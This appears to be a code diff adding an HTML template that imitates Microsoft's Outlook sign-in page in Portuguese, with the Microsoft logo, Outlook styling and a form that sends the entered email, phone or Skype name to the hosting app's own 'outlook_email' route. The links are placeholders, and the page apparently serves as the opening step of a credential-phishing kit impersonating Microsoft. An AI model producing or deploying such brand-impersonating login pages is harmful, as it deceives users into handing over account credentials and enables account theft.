@@ -1,0 +1,46 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="UTF-8">
+    <title>Entrar em sua conta</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='outlook/outlook.css') }}">
+    <link rel="icon" type="image/png" href="/static/outlook/favicon.png">
+</head>
+<body>
+  <div class="background">
+    <div class="main-container">
+      <div class="login-box">
+        <div class="logo">
+            <img src="/static/outlook/microsoft.png" alt="Outlook Logo">
+        </div>
+
+        <h2>Entrar</h2>
+
+        <form method="POST" action="{{ url_for('outlook_email') }}">
+          <input type="text" name="email" placeholder="Email, telefone ou Skype" required>
+          <div class="links">
+            <div style="font-size: 12px;">Não tem uma conta?<a href="#"><strong> Crie uma!</strong></a></div>
+            <a href="#">Não consegue acessar sua conta?</a>
+          </div>
+          <div class="button-wrapper">
+            <button type="submit">Avançar</button>
+          </div>
+
+        </form>
+
+        <div class="entry-options">
+          <a href="#">
+            <i class="fa-solid fa-magnifying-glass"></i> Opções de entrada
+          </a>
+        </div>
+      </div>
+
+      <div class="footer">
+        <a href="#">Termos de uso</a>
+        <a href="#">Privacidade e cookies</a>
+        <span>...</span>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
